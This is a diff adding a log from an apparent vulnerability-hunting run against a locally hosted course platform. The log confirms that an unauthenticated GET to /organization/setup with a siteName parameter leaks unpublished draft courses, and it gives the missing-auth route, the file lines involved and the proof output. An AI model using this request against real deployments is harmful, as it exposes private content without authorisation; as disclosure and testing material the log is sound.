@@ -1,0 +1,14 @@
+========================================================================
+VULN-034: Unauth GET /organization/setup leaks unpublished draft courses
+target: API=http://localhost:21527  dashboard=http://localhost:21526
+========================================================================
+[INFO] route apps/api/src/routes/organization/organization.ts:713 has NO auth middleware
+[INFO] query getCoursesBySiteNameForSetup (course.ts:360-373) filters ONLY siteName
+[SETUP] admin login
+[SETUP] draft course id=428d5f6a-bb3f-4348-b721-71e097ff44f3 title='Unreleased Draft d_21615242'  (db is_published|type|status = f|SELF_PACED|ACTIVE)
+[STEP] UNAUTHENTICATED (no cookie) GET /organization/setup?siteName=cve-hunt-academy
+[INFO]   response: HTTP 200
+[INFO]   data.courseData returned 161 courses to the anonymous caller
+[PROOF] anonymous /setup returned our just-created UNPUBLISHED draft 'Unreleased Draft d_21615242' (id=428d5f6a-bb3f-4348-b721-71e097ff44f3, isPublished=false) among 161 courses — no auth, no visibility gate
+==> VULN-034: CONFIRMED — unauth /organization/setup enumerates unpublished draft courses
+[OK] exploit confirmed — draft catalog leaked to an unauthenticated caller
